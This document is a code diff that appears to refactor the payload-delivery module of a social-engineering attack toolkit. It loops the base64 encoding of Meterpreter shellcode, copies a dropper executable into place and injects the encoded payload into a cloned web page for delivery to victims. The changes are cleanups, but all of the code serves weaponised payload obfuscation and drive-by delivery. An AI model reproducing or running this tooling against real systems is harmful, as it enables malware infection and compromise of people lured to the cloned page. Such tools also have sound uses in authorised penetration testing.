@@ -7,6 +7,7 @@ import os
 import re
 import socket
 import base64
+import shutil
 from src.core.setcore import *
 from src.core.menu.text import *
 from src.core.dictionaries import *
@@ -465,32 +466,10 @@ try:
                     fileopen = open("%s/meterpreter.alpha_decoded" % (userconfigpath), "r")
                     data = fileopen.read()
                     if payloadgen != "solo":
-                        # base64 1
-                        data = str(data)
-                        data = base64.b64encode(b'data')
-                        # encode it again for the fun 2
-                        data = base64.b64encode(b'data')
-                        # again 3
-                        data = base64.b64encode(b'data')
-                        # again 4
-                        data = base64.b64encode(b'data')
-                        # again 5
-                        data = base64.b64encode(b'data')
-                        # again 6
-                        data = base64.b64encode(b'data')
-                        # again 7
-                        data = base64.b64encode(b'data')
-                        # again 8
-                        data = base64.b64encode(b'data')
-                        # 9
-                        data = base64.b64encode(b'data')
-                        # 10
-                        data = base64.b64encode(b'data')
-                        # last one
-                        data = base64.b64encode(b'data')
-                        #
+                        for _ in range(11):
+                            data = base64.b64encode(data.encode("utf-8")).decode("ascii")
                     filewrite = open("%s/meterpreter.alpha" % (userconfigpath), "w")
-                    filewrite.write(str(data))
+                    filewrite.write(data)
                     filewrite.close()
                     if choice1 == "shellcode/alphanum":
                         print_status("Prepping shellcodeexec for delivery..")
@@ -501,20 +480,23 @@ try:
                         print_status("Prepping Multi-pyInjector for delivery..")
                     # here we obfuscate the binary a little bit
                     random_string = generate_random_string(3, 3).upper()
-                    if choice1 == "shellcode/alphanum":
-                        fileopen = open("%s/src/payloads/exe/shellcodeexec.binary" % (definepath), "rb").read()
-                    if choice1 == "shellcode/pyinject":
-                        fileopen = open("%s/src/payloads/set_payloads/pyinjector.binary" % (definepath), "rb").read()
-                    if choice1 == "shellcode/multipyinject":
-                        fileopen = open("%s/src/payloads/set_payloads/multi_pyinjector.binary" % (definepath), "rb").read()
+                    try:
+                        fileopen = open(legacy_payload_binary_path(definepath, choice1), "rb").read()
+                    except FileNotFoundError as error:
+                        print_error(str(error))
+                        print_error("Select a supported payload or provide a custom executable instead.")
+                        exit_set()
 
                     # write out the payload
-                    if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyiject":
+                    if choice1 == "shellcode/alphanum" or choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
                         filewrite = open(userconfigpath + "msf.exe", "wb")
                         filewrite.write(fileopen)
                         filewrite.close()
 
-                    subprocess.Popen("cp %s/shellcodeexec.custom %s/msf.exe 1> /dev/null 2> /dev/null" % (userconfigpath, userconfigpath), shell=True).wait()
+                    shutil.copyfile(
+                        os.path.join(userconfigpath, "shellcodeexec.custom"),
+                        os.path.join(userconfigpath, "msf.exe"),
+                    )
                     # we need to read in the old index.html file because its
                     # already generated, need to present the alphanum to it
                     if os.path.isfile("%s/web_clone/index.html" % (userconfigpath)):
@@ -526,9 +508,9 @@ try:
                         data = data.replace(
                             'param name="2" value=""', 'param name="2" value="%s"' % (alpha_shellcode))
                         if choice1 == "shellcode/multipyinject":
-                            secret = base64.b64encode(b'secret')
+                            secret = base64.b64encode(secret).decode("ascii")
                             data = data.replace('param name="10" value=""', 'param name="10" value ="%s"' % (secret))
-                        filewrite.write(str(data))
+                        filewrite.write(data)
 
                         # close file
                         filewrite.close()
@@ -539,7 +521,10 @@ try:
                         if choice1 == "shellcode/pyinject":
                             print_status("Prepping website for pyInjector shellcode injection..")
                         print_status("Base64 encoding shellcode and prepping for delivery..")
-                        subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html 1> /dev/null 2> /dev/null" % (userconfigpath, userconfigpath), shell=True).wait()
+                        os.replace(
+                            os.path.join(userconfigpath, "web_clone", "index.html.new"),
+                            os.path.join(userconfigpath, "web_clone", "index.html"),
+                        )
                     if choice9 == "windows/meterpreter/reverse_tcp_allports":
                         portnum = "LPORT=1"
                         choice3 = "1"
@@ -592,7 +577,7 @@ try:
 
                         # encode once, will need to decode later
                         x86 = x86.encode("utf-8")
-                        base_encode = base64.b64encode(x86)
+                        base_encode = base64.b64encode(x86).decode("ascii")
                         data = data.replace('param name="5" value=""', 'param name="5" value="%s"' % (base_encode))
                         data = data.replace('param name="6" value=""', 'param name="6" value="%s"' % (base_encode))
                         if choice1 == "cmd/multi": data = data.replace('param name="8" value="YES"', 'param name="8" value="NO"')
@@ -606,7 +591,10 @@ try:
 
                         filewrite.write(data)
                         filewrite.close()
-                        subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html" % (userconfigpath, userconfigpath), stdout=subprocess.PIPE, shell=True).wait()
+                        os.replace(
+                            os.path.join(userconfigpath, "web_clone", "index.html.new"),
+                            os.path.join(userconfigpath, "web_clone", "index.html"),
+                        )
 
         # here we specify the binary to deploy if we are using ones that are
         # required to drop binaries
@@ -618,7 +606,10 @@ try:
             data = data.replace('param name="8" value="NO"', 'param name="8" value="YES"')
             filewrite.write(data)
             filewrite.close()
-            subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html" % (userconfigpath, userconfigpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+            os.replace(
+                os.path.join(userconfigpath, "web_clone", "index.html.new"),
+                os.path.join(userconfigpath, "web_clone", "index.html"),
+            )
 
         # specify attack vector as SET interactive shell
         if choice1 == "set/reverse_shell":
